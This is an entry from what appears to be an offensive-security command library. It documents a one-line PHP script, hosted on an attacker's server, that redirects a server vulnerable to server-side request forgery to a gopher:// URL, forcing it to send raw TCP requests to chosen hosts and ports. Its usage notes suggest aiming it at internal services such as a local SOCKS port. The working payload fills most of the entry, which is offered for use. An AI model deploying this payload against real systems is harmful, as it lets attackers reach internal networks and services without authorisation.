---
id: cmd-php-gopher-redirect
data: '<?php header(''Location: gopher://192.166.218.53:80/test123''); ?>'
tags:
  - ssrf
  - redirect
  - gopher
type: command
output: null
executor: php
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:53:38.075Z'
verified: false
validated: true
submitted: true
---
# php-redirect-to-gopher

## Command

```php
<?php header('Location: gopher://192.166.218.53:80/test123'); ?>
```

## Description

PHP script hosted on attacker's server that issues a 302 redirect to a Gopher URL, forcing the SSRF target to send a TCP request to the specified host/port/path.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Location | Redirect URL (e.g., gopher://IP:PORT/PATH) | Yes |

## Examples

### Basic Usage

```php
<?php header('Location: gopher://192.166.218.53:80/test123'); ?>
```

### Advanced Usage

Adapt IP/port for different targets, e.g., gopher://127.0.0.1:1080/ for internal SOCKS.

## Expected Output

HTTP 302 Found with Location: gopher://... header, triggering protocol switch in the fetching client.

## Related

- [[commands/php-redirect-to-ftp]]
- [[procedures/Setup-Malicious-Redirect-Server]]
